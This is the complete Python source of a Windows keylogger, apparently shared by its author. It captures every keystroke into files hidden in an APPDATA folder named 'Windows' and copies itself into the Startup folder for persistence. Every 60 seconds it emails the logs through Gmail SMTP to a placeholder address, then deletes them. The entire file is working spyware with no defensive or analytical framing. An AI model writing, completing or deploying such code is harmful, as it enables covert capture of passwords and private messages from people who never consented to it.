import smtplib
import subprocess
import sys
import os
import shutil
import platform
import time
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Listener
import re

def install_package(package):
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
    except subprocess.CalledProcessError as e:
        print(f"Erro installing the package {package}: {e}")
        sys.exit(1)

def check_and_install_dependencies():
    required_packages = {
        'pynput': 'pynput',
        'datetime': 'datetime',
    }

    for import_name, package_name in required_packages.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"{package_name} is not installed. downloading {package_name}...")
            install_package(package_name)

def get_appdata_roaming_directory():
    if platform.system() == 'Windows':
        return os.path.join(os.getenv('APPDATA'), 'Windows')
    else:
        raise OSError('This code is not supprted in your OS')

def generate_file_name():
    now = datetime.now()
    timestamp = now.strftime("%d-%m-%Y_%H-%M-%S")
    return os.path.join(log_directory, f"KeyLog_{timestamp}.txt")

log_directory = get_appdata_roaming_directory()
os.makedirs(log_directory, exist_ok=True)

def format_key(key):
    key_str = str(key)
    key_str = re.sub(r"\'", "", key_str)
    key_str = re.sub(r"Key.delete", " Delete", key_str)
    key_str = re.sub(r"Key.space", " ", key_str)
    key_str = re.sub(r"Key.esc", "", key_str)
    key_str = re.sub(r"Key.alt", "", key_str)
    key_str = re.sub(r"Key.ctrl", "", key_str)
    key_str = re.sub(r"Key.shift", "", key_str)
    key_str = re.sub(r"Key.enter", " Enter", key_str)
    key_str = re.sub(r"Key.backspace", " Backspace", key_str)
    return key_str

def on_press(key):
    formatted_key = format_key(key)
    with open(file_name, "a") as log_file:
        log_file.write(formatted_key)

def enviar_log():
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    email_user = 'E-mail to send the key log'
    email_password = 'Password of the E-mail'

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = 'E-mail who gonna receive the key log'
    msg['Subject'] = 'Key Log Registry'

    body = f'''
    <p>Hi,</p>
    <p>Here are the key log of the day: {datetime.now().strftime("%m/%d/%Y - %H:%M")}</p>
    '''
    
    try:
        for log_file in os.listdir(log_directory):
            log_path = os.path.join(log_directory, log_file)
            if os.path.isfile(log_path):
                with open(log_path, 'r') as file:
                    conteudo_txt = file.read()
                    body += f'<pre>{conteudo_txt}</pre>'
                    
        msg.attach(MIMEText(body, 'html'))

        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(email_user, email_password)
        server.sendmail(email_user, 'E-mail who gonna receive the key log', msg.as_string())
        server.quit()
        print('Email send with success!')

        for log_file in os.listdir(log_directory):
            log_path = os.path.join(log_directory, log_file)
            if os.path.isfile(log_path):
                os.remove(log_path)
                print(f'File {log_file} deleted.')

    except Exception as e:
        print(f"Erro ao enviar o e-mail: {e}")

def start_keylogger():
    global file_name
    file_name = generate_file_name()
    with Listener(on_press=on_press) as listener:
        listener.join()

def copy_to_startup():
    if platform.system() == 'Windows':
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        current_exe = sys.executable
        destination = os.path.join(startup_folder, os.path.basename(current_exe))
        if not os.path.exists(destination):
            shutil.copyfile(current_exe, destination)
            print(f"Copy of the file {current_exe} to {destination} conclued with success.")

if __name__ == "__main__":
    
    check_and_install_dependencies()
    copy_to_startup()

    import threading
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    while True:
        time.sleep(60)
        enviar_log()

# Disc: colla99
# ASS: Colla
